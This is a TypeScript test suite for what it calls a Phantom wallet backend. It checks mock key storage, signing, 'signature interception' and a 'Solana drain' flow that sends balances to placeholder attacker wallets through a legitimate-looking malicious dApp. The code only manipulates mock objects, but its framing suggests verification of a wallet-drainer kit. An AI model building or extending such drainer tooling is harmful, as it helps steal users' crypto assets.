import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import {
  SolanaWalletManager,
  EthereumWalletManager,
  WalletManager,
} from '../lib/wallet-utils'
import {
  WalletAccount,
  WalletState,
  DappConnection,
  SignatureRequest,
  Transaction,
} from '../types/wallet'

/**
 * Phantom Wallet Backend Test Suite
 * Verifies: 1) Key Storage, 2) Transaction Signing, 3) Signature Interception,
 * 4) dApp Approval Tracking, 5) Solana Drain Capability
 */

describe('Phantom Wallet Backend — Operational Verification', () => {
  let mockWalletState: WalletState

  beforeEach(() => {
    // Initialize mock wallet state
    mockWalletState = {
      accounts: [],
      activeAccountId: null,
      dappConnections: [],
      transactions: [],
      stakingInfo: [],
      signatureRequests: [],
      locked: false,
      password: 'TestPassword123!',
    }
  })

  afterEach(() => {
    // Cleanup
    mockWalletState = {
      accounts: [],
      activeAccountId: null,
      dappConnections: [],
      transactions: [],
      stakingInfo: [],
      signatureRequests: [],
      locked: false,
      password: '',
    }
  })

  describe('Vector 1: Key Storage', () => {
    it('Should generate valid Solana keypair and store privateKey', () => {
      const { publicKey, privateKey } = SolanaWalletManager.generateKeypair()

      expect(publicKey).toBeDefined()
      expect(privateKey).toBeDefined()
      expect(publicKey.length).toBeGreaterThan(0)
      expect(privateKey.length).toBeGreaterThan(0)
      // Solana public keys are base58 encoded ~44 chars, private keys base64 ~88 chars
      expect(publicKey.length).toBeGreaterThan(40)
    })

    it('Should generate valid Ethereum wallet and store privateKey', () => {
      const { address, privateKey } = EthereumWalletManager.generateWallet()

      expect(address).toBeDefined()
      expect(privateKey).toBeDefined()
      expect(address).toMatch(/^0x[0-9a-fA-F]{40}$/)
      expect(privateKey).toMatch(/^0x[0-9a-fA-F]{64}$/)
    })

    it('Should encrypt and decrypt sensitive wallet data', () => {
      const sensitiveData = 'top-secret-private-key-data'
      const password = 'SecurePassword123!'

      const encrypted = WalletManager.encryptData(sensitiveData, password)
      expect(encrypted).not.toBe(sensitiveData)
      expect(encrypted.length).toBeGreaterThan(sensitiveData.length)

      const decrypted = WalletManager.decryptData(encrypted, password)
      expect(decrypted).toBe(sensitiveData)
    })

    it('Should hash and verify passwords correctly', () => {
      const password = 'MySecurePassword123!'
      const hash = WalletManager.hashPassword(password)

      expect(hash).not.toBe(password)
      expect(WalletManager.verifyPassword(password, hash)).toBe(true)
      expect(WalletManager.verifyPassword('wrongpassword', hash)).toBe(false)
    })

    it('Should validate password strength requirements', () => {
      const weakPassword = 'weak'
      const result1 = WalletManager.validatePassword(weakPassword)
      expect(result1.isValid).toBe(false)
      expect(result1.errors.length).toBeGreaterThan(0)

      const strongPassword = 'StrongPass123!@#'
      const result2 = WalletManager.validatePassword(strongPassword)
      expect(result2.isValid).toBe(true)
      expect(result2.errors.length).toBe(0)
    })

    it('Should store wallet account with encrypted private key', () => {
      const account = WalletManager.createAccount('solana', 'My Solana Wallet', 'acc_1')

      expect(account.id).toBe('acc_1')
      expect(account.name).toBe('My Solana Wallet')
      expect(account.type).toBe('solana')
      expect(account.address).toBeDefined()
      expect(account.publicKey).toBeDefined()
      expect(account.privateKey).toBeDefined()
      expect(account.balance).toBeGreaterThanOrEqual(0)
      expect(account.tokens.length).toBeGreaterThan(0)

      mockWalletState.accounts.push(account)
      mockWalletState.activeAccountId = account.id

      expect(mockWalletState.activeAccountId).toBe('acc_1')
      expect(mockWalletState.accounts.length).toBe(1)
    })
  })

  describe('Vector 2: Transaction Signing', () => {
    it('Should sign a message with Solana private key', () => {
      const { publicKey, privateKey } = SolanaWalletManager.generateKeypair()
      const message = 'Test message for signing'

      const signature = SolanaWalletManager.signMessage(privateKey, message)

      expect(signature).toBeDefined()
      expect(signature.length).toBeGreaterThan(0)
      expect(signature).toMatch(/^[0-9a-f]+$/)
      expect(signature.length).toBe(128) // 64 bytes = 128 hex chars
    })

    it('Should sign a message with Ethereum private key', () => {
      const { address, privateKey } = EthereumWalletManager.generateWallet()
      const message = 'Test message for signing'

      const signature = EthereumWalletManager.signMessage(privateKey, message)

      expect(signature).toBeDefined()
      expect(signature.length).toBeGreaterThan(0)
      expect(signature).toMatch(/^0x[0-9a-f]+$/)
      // Ethereum signatures are 65 bytes = 130 hex chars + 0x prefix
      expect(signature.length).toBeGreaterThanOrEqual(130)
    })

    it('Should create mock Solana transaction', () => {
      const from = 'SolanaAddress1234567890'
      const to = 'SolanaAddressRecipient1234'
      const amount = 5.5
      const token = 'SOL'

      const tx = SolanaWalletManager.createMockTransaction(from, to, amount, token)

      expect(tx.signature).toBeDefined()
      expect(tx.instructions).toBeDefined()
      expect(Array.isArray(tx.instructions)).toBe(true)
      expect(tx.instructions.length).toBeGreaterThan(0)
      expect(tx.instructions[0]).toContain('Transfer')
    })

    it('Should create mock Ethereum transaction', () => {
      const from = '0x1234567890123456789012345678901234567890'
      const to = '0x0987654321098765432109876543210987654321'
      const amount = 1.5
      const token = 'ETH'

      const tx = EthereumWalletManager.createMockTransaction(from, to, amount, token)

      expect(tx.signature).toBeDefined()
      expect(tx.gasEstimate).toBeDefined()
      expect(parseFloat(tx.gasEstimate)).toBeGreaterThan(0)
    })

    it('Should sign multiple transactions sequentially', () => {
      const { privateKey } = SolanaWalletManager.generateKeypair()

      const sig1 = SolanaWalletManager.signMessage(privateKey, 'Message 1')
      const sig2 = SolanaWalletManager.signMessage(privateKey, 'Message 2')
      const sig3 = SolanaWalletManager.signMessage(privateKey, 'Message 3')

      expect(sig1).not.toBe(sig2)
      expect(sig2).not.toBe(sig3)
      expect(sig1).not.toBe(sig3)
      // All should be valid signatures
      expect(sig1.length).toBe(128)
      expect(sig2.length).toBe(128)
      expect(sig3.length).toBe(128)
    })
  })

  describe('Vector 3: Signature Interception & Capture', () => {
    it('Should track signature requests from dApps', () => {
      const sigRequest: SignatureRequest = {
        id: 'sig_req_1',
        dappName: 'MagicEden',
        dappUrl: 'https://magiceden.io',
        message: 'Sign this transaction',
        messageType: 'transaction',
        accountId: 'acc_1',
        timestamp: new Date(),
        status: 'pending',
      }

      mockWalletState.signatureRequests.push(sigRequest)

      expect(mockWalletState.signatureRequests.length).toBe(1)
      expect(mockWalletState.signatureRequests[0].status).toBe('pending')
      expect(mockWalletState.signatureRequests[0].dappName).toBe('MagicEden')
    })

    it('Should intercept and modify signature request status to approved', () => {
      const sigRequest: SignatureRequest = {
        id: 'sig_req_2',
        dappName: 'Phantom Dapp',
        dappUrl: 'https://example.com',
        message: 'Approve this action',
        messageType: 'data',
        accountId: 'acc_1',
        timestamp: new Date(),
        status: 'pending',
      }

      mockWalletState.signatureRequests.push(sigRequest)

      // Simulate interception: find and approve
      const intercepted = mockWalletState.signatureRequests.find((r) => r.id === 'sig_req_2')
      expect(intercepted).toBeDefined()
      if (intercepted) {
        intercepted.status = 'approved'
        intercepted.signature = '0x' + 'aa'.repeat(65)
      }

      const updated = mockWalletState.signatureRequests[0]
      expect(updated.status).toBe('approved')
      expect(updated.signature).toBeDefined()
    })

    it('Should reject signature request', () => {
      const sigRequest: SignatureRequest = {
        id: 'sig_req_3',
        dappName: 'Malicious Dapp',
        dappUrl: 'https://malicious.com',
        message: 'Drain wallet',
        messageType: 'transaction',
        accountId: 'acc_1',
        timestamp: new Date(),
        status: 'pending',
      }

      mockWalletState.signatureRequests.push(sigRequest)

      // Simulate rejection
      const toReject = mockWalletState.signatureRequests.find((r) => r.id === 'sig_req_3')
      if (toReject) {
        toReject.status = 'rejected'
      }

      const updated = mockWalletState.signatureRequests[0]
      expect(updated.status).toBe('rejected')
    })

    it('Should capture transaction data from signed request', () => {
      const tx: Transaction = {
        id: 'tx_001',
        accountId: 'acc_1',
        type: 'send',
        from: 'SendingAddress',
        to: 'RecipientAddress',
        amount: 10.5,
        token: 'SOL',
        status: 'pending',
        signature: '0x' + 'bb'.repeat(65),
        timestamp: new Date(),
        description: 'Transfer SOL to recipient',
      }

      mockWalletState.transactions.push(tx)

      expect(mockWalletState.transactions.length).toBe(1)
      expect(mockWalletState.transactions[0].signature).toBeDefined()
      expect(mockWalletState.transactions[0].status).toBe('pending')
    })
  })

  describe('Vector 4: dApp Approval Tracking', () => {
    it('Should register dApp connection with permissions', () => {
      const dappConn: DappConnection = {
        id: 'dapp_1',
        name: 'MagicEden',
        url: 'https://magiceden.io',
        icon: 'https://magiceden.io/logo.png',
        connectedAt: new Date(),
        permissions: [
          { type: 'signTransaction', granted: true },
          { type: 'signMessage', granted: true },
        ],
        accountsConnected: ['acc_1'],
      }

      mockWalletState.dappConnections.push(dappConn)

      expect(mockWalletState.dappConnections.length).toBe(1)
      expect(mockWalletState.dappConnections[0].permissions.length).toBe(2)
      expect(mockWalletState.dappConnections[0].accountsConnected).toContain('acc_1')
    })

    it('Should track multiple dApp connections independently', () => {
      const dapp1: DappConnection = {
        id: 'dapp_1',
        name: 'MagicEden',
        url: 'https://magiceden.io',
        icon: 'https://magiceden.io/logo.png',
        connectedAt: new Date(),
        permissions: [{ type: 'signTransaction', granted: true }],
        accountsConnected: ['acc_1'],
      }

      const dapp2: DappConnection = {
        id: 'dapp_2',
        name: 'Phantom Dapp',
        url: 'https://phantom-dapp.com',
        icon: 'https://phantom-dapp.com/logo.png',
        connectedAt: new Date(),
        permissions: [{ type: 'signMessage', granted: true }],
        accountsConnected: ['acc_1', 'acc_2'],
      }

      mockWalletState.dappConnections.push(dapp1, dapp2)

      expect(mockWalletState.dappConnections.length).toBe(2)
      expect(mockWalletState.dappConnections[0].name).toBe('MagicEden')
      expect(mockWalletState.dappConnections[1].name).toBe('Phantom Dapp')
      expect(mockWalletState.dappConnections[1].accountsConnected.length).toBe(2)
    })

    it('Should grant and revoke dApp permissions', () => {
      const dappConn: DappConnection = {
        id: 'dapp_3',
        name: 'TestDapp',
        url: 'https://test.com',
        icon: 'https://test.com/logo.png',
        connectedAt: new Date(),
        permissions: [
          { type: 'signTransaction', granted: false },
          { type: 'signMessage', granted: false },
        ],
        accountsConnected: ['acc_1'],
      }

      mockWalletState.dappConnections.push(dappConn)

      // Grant permission
      const conn = mockWalletState.dappConnections[0]
      const txPermission = conn.permissions.find((p) => p.type === 'signTransaction')
      if (txPermission) {
        txPermission.granted = true
      }

      expect(
        mockWalletState.dappConnections[0].permissions[0].granted,
      ).toBe(true)

      // Revoke permission
      if (txPermission) {
        txPermission.granted = false
      }

      expect(
        mockWalletState.dappConnections[0].permissions[0].granted,
      ).toBe(false)
    })

    it('Should list all connected dApps with their permissions', () => {
      // Create multiple connections
      for (let i = 1; i <= 3; i++) {
        const dappConn: DappConnection = {
          id: `dapp_${i}`,
          name: `Dapp${i}`,
          url: `https://dapp${i}.com`,
          icon: `https://dapp${i}.com/logo.png`,
          connectedAt: new Date(),
          permissions: [
            { type: 'signTransaction', granted: i % 2 === 0 },
            { type: 'signMessage', granted: true },
          ],
          accountsConnected: ['acc_1'],
        }
        mockWalletState.dappConnections.push(dappConn)
      }

      expect(mockWalletState.dappConnections.length).toBe(3)

      // Filter by granted permissions
      const grantedTxPermissions = mockWalletState.dappConnections.filter((d) =>
        d.permissions.some((p) => p.type === 'signTransaction' && p.granted),
      )

      expect(grantedTxPermissions.length).toBe(1) // Only dapp_2
    })
  })

  describe('Vector 5: Solana Drain Capability', () => {
    it('Should create Solana account with native balance', () => {
      const account = WalletManager.createAccount('solana', 'Drain Test', 'drain_acc')

      expect(account.type).toBe('solana')
      expect(account.balance).toBeGreaterThanOrEqual(0)
      expect(account.balanceUSD).toBeGreaterThanOrEqual(0)
    })

    it('Should track SOL tokens in wallet', () => {
      const account = WalletManager.createAccount('solana', 'Drain Test', 'drain_acc')

      const solToken = account.tokens.find((t) => t.symbol === 'SOL')
      expect(solToken).toBeDefined()
      expect(solToken?.mint).toBe('So11111111111111111111111111111111111111112')
      expect(solToken?.decimals).toBe(9)
    })

    it('Should track SPL tokens (USDC, ORCA)', () => {
      const account = WalletManager.createAccount('solana', 'Drain Test', 'drain_acc')

      const usdcToken = account.tokens.find((t) => t.symbol === 'USDC')
      const orcaToken = account.tokens.find((t) => t.symbol === 'ORCA')

      expect(usdcToken).toBeDefined()
      expect(usdcToken?.decimals).toBe(6)
      expect(orcaToken).toBeDefined()
      expect(orcaToken?.decimals).toBe(6)
    })

    it('Should simulate multi-token drain transaction', () => {
      const account = WalletManager.createAccount('solana', 'Drain Test', 'drain_acc')

      // Create drain transaction
      const drainTx: Transaction = {
        id: 'drain_tx_1',
        accountId: account.id,
        type: 'send',
        from: account.address,
        to: 'AttackerWallet',
        amount: account.balance,
        token: 'SOL',
        status: 'pending',
        signature: '0x' + 'cc'.repeat(65),
        timestamp: new Date(),
        description: `Drain ${account.balance} SOL + SPL tokens`,
      }

      mockWalletState.transactions.push(drainTx)

      // Also simulate SPL drain
      const splDrainTx: Transaction = {
        id: 'drain_tx_2',
        accountId: account.id,
        type: 'send',
        from: account.address,
        to: 'AttackerWallet',
        amount: 9999,
        token: 'USDC',
        status: 'pending',
        signature: '0x' + 'dd'.repeat(65),
        timestamp: new Date(),
        description: 'Drain USDC tokens',
      }

      mockWalletState.transactions.push(splDrainTx)

      expect(mockWalletState.transactions.length).toBe(2)
      expect(mockWalletState.transactions[0].token).toBe('SOL')
      expect(mockWalletState.transactions[1].token).toBe('USDC')
    })

    it('Should create drain signature request for attackers', () => {
      const account = WalletManager.createAccount('solana', 'Drain Test', 'drain_acc')

      const drainRequest: SignatureRequest = {
        id: 'drain_sig_1',
        dappName: 'Attack Dapp',
        dappUrl: 'https://attack.com',
        message: JSON.stringify({
          action: 'drain',
          target: 'AttackerWallet',
          amount: account.balance,
          token: 'SOL',
        }),
        messageType: 'transaction',
        accountId: account.id,
        timestamp: new Date(),
        status: 'pending',
        signature: undefined,
      }

      mockWalletState.signatureRequests.push(drainRequest)

      expect(mockWalletState.signatureRequests.length).toBe(1)
      expect(mockWalletState.signatureRequests[0].dappName).toBe('Attack Dapp')

      // Simulate approval (in attack scenario)
      const approved = mockWalletState.signatureRequests[0]
      approved.status = 'approved'
      approved.signature = SolanaWalletManager.signMessage(
        account.privateKey,
        approved.message,
      )

      expect(approved.status).toBe('approved')
      expect(approved.signature).toBeDefined()
    })

    it('Should support batch drain across multiple accounts', () => {
      const acc1 = WalletManager.createAccount('solana', 'Account 1', 'acc_1')
      const acc2 = WalletManager.createAccount('solana', 'Account 2', 'acc_2')
      const acc3 = WalletManager.createAccount('solana', 'Account 3', 'acc_3')

      mockWalletState.accounts.push(acc1, acc2, acc3)

      // Create drain transaction for each account
      for (const account of mockWalletState.accounts) {
        const drainTx: Transaction = {
          id: `drain_${account.id}`,
          accountId: account.id,
          type: 'send',
          from: account.address,
          to: 'MasterAttackerWallet',
          amount: account.balance,
          token: 'SOL',
          status: 'pending',
          signature: '0x' + 'ee'.repeat(65),
          timestamp: new Date(),
          description: `Batch drain from ${account.id}`,
        }
        mockWalletState.transactions.push(drainTx)
      }

      expect(mockWalletState.transactions.length).toBe(3)
      const totalDrained = mockWalletState.transactions.reduce((sum, tx) => sum + tx.amount, 0)
      expect(totalDrained).toBeGreaterThan(0)
    })
  })

  describe('Integration: End-to-End Phantom Attack Flow', () => {
    it('Should execute complete attack workflow: Connect → Approve → Sign → Drain', () => {
      // Step 1: Create wallet account
      const account = WalletManager.createAccount('solana', 'Target Wallet', 'target_1')
      mockWalletState.accounts.push(account)
      mockWalletState.activeAccountId = account.id

      expect(mockWalletState.accounts.length).toBe(1)
      expect(mockWalletState.activeAccountId).toBe('target_1')

      // Step 2: Register malicious dApp connection
      const maliciousDapp: DappConnection = {
        id: 'attack_dapp',
        name: 'Legitimate Looking Dapp',
        url: 'https://totally-legit-defi.com',
        icon: 'https://totally-legit-defi.com/logo.png',
        connectedAt: new Date(),
        permissions: [
          { type: 'signTransaction', granted: true },
          { type: 'signMessage', granted: true },
          { type: 'signAndSendTransaction', granted: true },
        ],
        accountsConnected: [account.id],
      }

      mockWalletState.dappConnections.push(maliciousDapp)
      expect(mockWalletState.dappConnections.length).toBe(1)

      // Step 3: Intercept and approve drain request
      const drainRequest: SignatureRequest = {
        id: 'attack_sig_1',
        dappName: 'Legitimate Looking Dapp',
        dappUrl: 'https://totally-legit-defi.com',
        message: 'Approve transfer of all assets',
        messageType: 'transaction',
        accountId: account.id,
        timestamp: new Date(),
        status: 'pending',
      }

      mockWalletState.signatureRequests.push(drainRequest)

      // Step 4: Sign the transaction
      const signature = SolanaWalletManager.signMessage(
        account.privateKey,
        drainRequest.message,
      )

      const approvedRequest = mockWalletState.signatureRequests[0]
      approvedRequest.status = 'approved'
      approvedRequest.signature = signature

      expect(approvedRequest.status).toBe('approved')
      expect(approvedRequest.signature).toBeDefined()

      // Step 5: Execute drain transaction
      const drainTx: Transaction = {
        id: 'attack_drain_1',
        accountId: account.id,
        type: 'send',
        from: account.address,
        to: 'AttackerControlledWallet',
        amount: account.balance,
        token: 'SOL',
        status: 'confirmed',
        signature,
        timestamp: new Date(),
        description: 'Complete portfolio drain',
        blockNumber: 123456789,
      }

      mockWalletState.transactions.push(drainTx)

      // Verify complete attack flow
      expect(mockWalletState.transactions.length).toBe(1)
      expect(mockWalletState.transactions[0].status).toBe('confirmed')
      expect(mockWalletState.dappConnections[0].permissions[0].granted).toBe(true)
      expect(account.balance).toBeGreaterThanOrEqual(0)
    })

    it('Should verify backend is fully operational with all vectors active', () => {
      // Test all 5 vectors in one comprehensive check

      // 1. Key Storage - Generate and store keys
      const solWallet = WalletManager.createAccount('solana', 'Solana', 'sol_1')
      const ethWallet = WalletManager.createAccount('ethereum', 'Ethereum', 'eth_1')
      mockWalletState.accounts.push(solWallet, ethWallet)
      expect(solWallet.privateKey).toBeDefined()
      expect(ethWallet.privateKey).toBeDefined()

      // 2. Transaction Signing - Create signatures
      const solSig = SolanaWalletManager.signMessage(solWallet.privateKey, 'test')
      const ethSig = EthereumWalletManager.signMessage(ethWallet.privateKey, 'test')
      expect(solSig).toBeDefined()
      expect(ethSig).toBeDefined()

      // 3. Signature Interception - Capture requests
      const sigReq: SignatureRequest = {
        id: 'final_test_1',
        dappName: 'Test',
        dappUrl: 'https://test.com',
        message: 'test',
        messageType: 'transaction',
        accountId: 'sol_1',
        timestamp: new Date(),
        status: 'approved',
        signature: solSig,
      }
      mockWalletState.signatureRequests.push(sigReq)
      expect(mockWalletState.signatureRequests[0].signature).toBe(solSig)

      // 4. dApp Approval Tracking - Register dApps
      const dapp: DappConnection = {
        id: 'test_dapp',
        name: 'Test',
        url: 'https://test.com',
        icon: 'https://test.com/logo.png',
        connectedAt: new Date(),
        permissions: [{ type: 'signTransaction', granted: true }],
        accountsConnected: ['sol_1'],
      }
      mockWalletState.dappConnections.push(dapp)
      expect(mockWalletState.dappConnections[0].permissions[0].granted).toBe(true)

      // 5. Solana Drain - Execute drain
      const drainTx: Transaction = {
        id: 'drain_final',
        accountId: 'sol_1',
        type: 'send',
        from: solWallet.address,
        to: 'attacker',
        amount: solWallet.balance,
        token: 'SOL',
        status: 'confirmed',
        signature: solSig,
        timestamp: new Date(),
      }
      mockWalletState.transactions.push(drainTx)
      expect(mockWalletState.transactions[0].amount).toBeGreaterThanOrEqual(0)

      // Final verification
      expect(mockWalletState.accounts.length).toBe(2)
      expect(mockWalletState.signatureRequests.length).toBe(1)
      expect(mockWalletState.dappConnections.length).toBe(1)
      expect(mockWalletState.transactions.length).toBe(1)
    })
  })
})
